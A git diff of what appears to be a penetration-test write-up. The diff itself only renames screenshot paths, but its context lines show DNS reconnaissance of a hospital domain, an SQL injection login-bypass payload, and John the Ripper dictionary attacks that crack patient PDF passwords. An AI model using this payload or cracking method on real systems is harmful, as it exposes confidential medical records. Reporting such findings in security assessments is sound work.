@@ -66,14 +66,14 @@ host -t mx medirozahospital.com
 ```bash
 host -t ns medirozahospital.com
 ```
-![NS record lookup](screenshots/ns.png)
+![NS record lookup](ns.png)
 
 Confirmed host reachability and resolved IP:
 
 ```bash
 ping medirozahospital.com
 ```
-![Ping test](screenshots/ping.png)
+![Ping test](ping.png)
 
 #### Step 2: Attack Surface Mapping
 
@@ -88,13 +88,13 @@ Username: admin' --
 Password: <anything>
 ```
 
-![SQL injection payload](screenshots/sql_injection.png)
+![SQL injection payload](sqlinjection.png)
 
 #### Step 4: Access Granted
 
 The payload bypassed authentication and returned an authenticated session, exposing the patient's lab report listing (`/patient/portal.php`) with all 3 confidential PDF reports available for download:
 
-![Successful login bypass](screenshots/succesfuly_logedin.png)
+![Successful login bypass](succesfulylogedin.png)
 
 **Finding:** Unauthenticated, fully reliable SQL injection authentication bypass — **Critical**. Also reveals a secondary Broken Access Control issue, since the bypassed session could see *all* patients' files rather than a single account's records.
 
@@ -109,24 +109,24 @@ Each retrieved PDF was individually password-protected. All three were decrypted
 ```bash
 john --wordlist=/home/kali/Desktop/password-wordlist.txt hash1.txt
 ```
-![Password cracked - file 1](screenshots/pdf1_password_pound.png)
+![Password cracked - file 1](pdf1passwordpound.png)
 
 Password recovered: **`123456`**
 
-![Password entered - file 1](screenshots/pdf1_password.png)
-![PDF opened - file 1](screenshots/pdf1_opend.png)
+![Password entered - file 1](pdf1password.png)
+![PDF opened - file 1](pdf1opend.png)
 
 #### File 2 — `patient_report_2.pdf` (P. Reddy)
 
 ```bash
 john --wordlist=/home/kali/Desktop/password-wordlist.txt hash2.txt
 ```
-![Password cracked - file 2](screenshots/pdf2_password_pound.png)
+![Password cracked - file 2](pdf2passwordpound.png)
 
 Password recovered: **`password`**
 
-![Password entered - file 2](screenshots/pdf2_password.png)
-![PDF opened - file 2](screenshots/pdf2_opend.png)
+![Password entered - file 2](pdf2password.png)
+![PDF opened - file 2](pdf2opend.png)
 
 #### File 3 — `patient_report_3.pdf` (E. Thompson)
 
@@ -135,12 +135,12 @@ The custom wordlist did not work for this file, so a larger wordlist was used in
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
 ```
-![Password cracked - file 3](screenshots/pdf3_password_pound.png)
+![Password cracked - file 3](pdf3passwordpound.png)
 
 Password recovered: **`!@#$%^&`**
 
-![Password entered - file 3](screenshots/pdf3_password.png)
-![PDF opened - file 3](screenshots/pdf3_opend.png)
+![Password entered - file 3](pdf3password.png)
+![PDF opened - file 3](pdf3opend.png)
 
 **Finding:** Weak, human-chosen PDF passwords — **High**. The encryption itself (PDF standard MD5-RC4 / SHA2-AES) was not broken; the passwords were simply weak enough to fall to dictionary attacks within seconds.
 
